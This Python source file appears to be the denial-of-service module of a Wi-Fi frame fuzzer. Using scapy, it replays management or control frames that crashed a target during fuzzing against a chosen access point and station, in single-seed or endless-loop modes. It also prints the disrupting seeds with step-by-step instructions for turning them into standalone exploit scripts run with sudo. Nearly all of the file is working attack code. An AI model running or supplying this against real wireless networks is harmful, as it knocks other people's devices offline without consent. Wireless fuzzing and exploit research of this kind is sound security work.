from scapy.all import sendp
from fuzzer_init import *
from Mngmt_frames.Construct_frame_fields import NUM_OF_FRAMES_TO_SEND, bcolors
from Connection_monitors.DeauthMonitor import DeauthMon
from Connection_monitors.AlivenessCheck import AllvCheck
from ascii_art import dos_attack, wifi
import os
import codecs
import subprocess
import settings
from time import sleep

    
def nec_checks():
    Aliveness = AllvCheck(targeted_STA, 'attacking')
    Aliveness.start()
    Deauth_monitor = DeauthMon(targeted_AP, targeted_STA, att_interface)
    Deauth_monitor.start()


def DoS_attack_init(file_list, mode, frames_dir):
    chosen_files_list = []
    frames_list = []
    subprocess.call(['clear'], shell=True)
    print(dos_attack)
    print(wifi)
    if mode == 1 or mode == 3:
        for file in file_list:
            if 'Aliveness'in file:
                chosen_files_list.append(file)
            elif 'Deauth' in file: 
                chosen_files_list.append(file)
    elif mode == 2:
        for file in file_list:
            if 'till_disr' in file:
                chosen_files_list.append(file)
    else:
        print(bcolors.FAIL + '\nNo relevant files found :(' + bcolors.ENDC)
        os._exit(0)
    for files in chosen_files_list:
        with open(current_dir + frames_dir + files, 'r') as f:
            for line in f:
                if "frame = " in line:
                    temp = line.strip("frame = \nb'")
                    try:
                        frames_list.append(temp.encode().decode('unicode_escape').encode("raw_unicode_escape"))
                    except:
                        pass
    return frames_list
    
    
def print_exploit(frame, frame_type):
    if frame_type == 1:
        print(bcolors.OKGREEN + "\n----You may got yourself an exploit----" + bcolors.ENDC)
        print(f'\n{frame[32:]}\n')
        print('Copy the above seed to the exploit.py file and replace it with the field ' + bcolors.OKBLUE + '{SEED}' + bcolors.ENDC)
        subtype = int(int.from_bytes(frame[8:9], "big") / 16)
        print('Replace ' + bcolors.OKBLUE + '{SUBTYPE} ' + bcolors.ENDC + f'with {subtype}')
        print('\nAlso do the replacements:')
        print(bcolors.OKBLUE + '{DESTINATION_MAC}' + bcolors.ENDC + ' = targeted_AP/targeted_STA, ' + bcolors.OKBLUE + '{SOURCE_MAC}' + bcolors.ENDC + ' = targeted_AP/targeted_STA, ' + bcolors.OKBLUE + '{AP_MAC}' + bcolors.ENDC + ' = targeted_AP')
        print('\nFinally, replace' + bcolors.OKBLUE + ' {ATT_INTERFACE}' + bcolors.ENDC + ' with your WNIC attacking interface')
        print(f'\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}sudo python3 exploit_mngmt.py{bcolors.ENDC}')
        print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
        input(f"{bcolors.OKCYAN}Press enter to continue to the next seed: {bcolors.ENDC}\n")
        subprocess.call(['clear'], shell=True)
    elif frame_type == 2:
        print(bcolors.OKGREEN + "\n----You may got yourself an exploit----" + bcolors.ENDC)
        subtype = int(int.from_bytes(frame[8:9], "big") / 16)
        if subtype in {4,5,6}:
             print(f'\n{frame[19:]}\n')
        else:
            print(f'\n{frame[25:]}\n')
        print('Copy the above seed to the exploit.py file and replace it with the field ' + bcolors.OKBLUE + '{SEED}' + bcolors.ENDC)
        print('Replace ' + bcolors.OKBLUE + '{SUBTYPE} ' + bcolors.ENDC + f'with {subtype}')
        print('Replace ' + bcolors.OKBLUE + '{FCf} ' + bcolors.ENDC + 'with ' + f'{int.from_bytes(frame[9:10], "big")}')
        print('\nAlso do the replacements:')
        print(bcolors.OKBLUE + '{DESTINATION_MAC}' + bcolors.ENDC + ' = targeted_AP/targeted_STA, ' + bcolors.OKBLUE + '{SOURCE_MAC}' + bcolors.ENDC + ' = targeted_AP/targeted_STA')
        print('\nFinally, replace' + bcolors.OKBLUE + ' {ATT_INTERFACE}' + bcolors.ENDC + ' with your WNIC attacking interface')
        print(f'\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}sudo python3 exploit_ctrl.py{bcolors.ENDC}')
        print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
        input(f"{bcolors.OKCYAN}Press enter to continue to the next seed: {bcolors.ENDC}\n")
        subprocess.call(['clear'], shell=True)
    
def send_frames(frames_list, mode, frame_type):
    counter = 0
    if mode == 1:
        try:
            num_of_frames = int(input('\nType the number of frames to transmit per seed: '))
        except:
            print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
            os._exit(0)
        for frame in frames_list:
            print(f'Sending {num_of_frames} frames of the {counter + 1} seed..')
            for _ in range(0, num_of_frames):
                sendp(frame, count=1, iface=att_interface, verbose=0)
                if not settings.is_alive:
                    print_exploit(frame, frame_type)
                    sleep(10)
                    settings.is_alive = True
                    settings.conn_loss = False
                    break
                elif settings.conn_loss:
                    print_exploit(frame, frame_type)
                    sleep(10)
                    settings.is_alive = True
                    settings.conn_loss = False      
                    break
            counter += 1        
        print('\n' + bcolors.FAIL + 'No more seeds found in the fuzzer’s log files' + bcolors.ENDC)
        print('Exiting attack!!')
        os._exit(0)
    elif mode == 2:
        print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
        print(bcolors.OKGREEN + "Launching the attack...." + bcolors.ENDC)
        print(bcolors.OKGREEN + "Stop the attack with Ctrl+c" + bcolors.ENDC)
        print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
        while True:
            for frame in frames_list:
                sendp(frame, count=1, iface=att_interface, verbose=0)
    elif mode == 3:
        print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
        print(bcolors.OKGREEN + "Launching the attack...." + bcolors.ENDC)
        print(bcolors.OKGREEN + "Stop the attack with Ctrl+c" + bcolors.ENDC)
        print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
        while True:
            for frame in frames_list:
                sendp(frame, count=NUM_OF_FRAMES_TO_SEND, iface=att_interface, verbose=0)
    else:
        print(bcolors.FAIL + '\nNo such choice :(' + bcolors.ENDC)
        os._exit(0)
    

print(dos_attack)
print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
print('\t\tThis module launches a DoS attack based on the data (log files) collected from the fuzzing process.\n\t\tIt can only be performed against the same AP and STA used during the fuzzing process.\n\t\t Namely, the frames that caused any kind of problematic behavior during the fuzzing are being transmitted\n\t\tare transmitted in an endless loop.\n\n')
print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
print('1) Frames detected at the moment of STA connectivity disruption, one-by-one')
print('2) Sequence of frames till the moment a disruption was detected ' + bcolors.WARNING + '(BETA)' + bcolors.ENDC)
print('3) Frames detected at the moment of STA connectivity disruption ' + bcolors.WARNING + '(BETA)' + bcolors.ENDC + '\n\n')
try:
    choice = int(input('Select the type of frames you wish to attack with: '))
except:
    print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
    os._exit(0)
subprocess.call(['clear'], shell=True)
print(dos_attack)
print('1) Management Frames')
print('2) Control Frames\n\n')
try:
    choice1 = int(input('Select the type of the frames: '))
except:
    print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
    os._exit(0)
current_dir = os.getcwd()
if choice1 == 1:
    file_list = os.listdir(current_dir + "/Logs/fuzz_mngmt_frames")
    frames_dir = "/Logs/fuzz_mngmt_frames/"
elif choice1 == 2:
    file_list = os.listdir(current_dir + "/Logs/fuzz_ctrl_frames")
    frames_dir = "/Logs/fuzz_ctrl_frames/"
else:
    print(bcolors.FAIL + '\nNo such choice :(' + bcolors.ENDC)
    os._exit(0)

init_att = DoS_attack_init(file_list, choice, frames_dir)
nec_checks()
sleep(20)

subprocess.call(['clear'], shell=True)
send_frames(init_att, choice, choice1)
